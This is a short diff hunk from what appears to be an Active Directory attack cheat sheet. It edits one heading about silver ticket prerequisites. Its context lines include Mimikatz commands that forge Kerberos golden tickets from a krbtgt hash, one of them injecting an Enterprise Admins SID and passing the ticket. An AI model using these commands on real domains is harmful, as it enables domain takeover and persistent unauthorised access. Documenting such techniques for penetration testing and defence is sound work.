@@ -329,7 +329,7 @@ mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-
 mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
 ```
 
-#### SPN NTLM hash + Domain SID
+#### LocalAdmin + SPN NTLM hash + Domain SID
 #### Silver Ticket: forged service ticket (TGS)
 
 Goal: create silver ticket = forged TGS/service ticket, signed with the service account or machine account key
